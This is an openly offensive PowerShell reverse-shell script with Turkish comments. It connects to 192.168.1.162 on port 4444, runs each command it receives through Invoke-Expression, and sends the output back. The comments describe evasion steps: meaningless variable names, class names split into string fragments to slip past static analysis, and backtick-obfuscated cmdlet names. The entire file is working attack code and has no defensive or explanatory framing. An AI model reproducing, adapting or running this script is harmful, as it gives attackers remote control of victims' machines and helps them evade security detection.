# Değişkenleri anlamsızlaştıralım
$ip = "192.168.1.162"
$p = 4444

# Kritik sınıfları parçalayarak çağırıyoruz (Statik analizi atlatmak için)
$s1 = "Net.Sock" + "ets.TCPCl" + "ient"
$s2 = "IO.Stream" + "Reader"
$s3 = "IO.Stream" + "Writer"

$c = New-Object $s1($ip, $p)
$n = $c.GetStream()
$r = New-Object $s2($n)
$w = New-Object $s3($n)
$w.AutoFlush = $true
$b = New-Object byte[] 1024

while ($c.Connected) {
    while ($n.DataAvailable) {
        $rd = $n.Read($b, 0, $b.Length)
        $t = ([Text.Encoding]::U`TF8).GetString($b, 0, $rd)
        
        # 'iex' yerine 'Invoke-Expression' kullanıp onu da ters tırnakla gizleyelim
        $out = (I`nvoke-Ex`pression $t 2>&1 | O`ut-St`ring)
        
        $w.Write($out)
    }
    Start-Sleep -Milliseconds 100
}
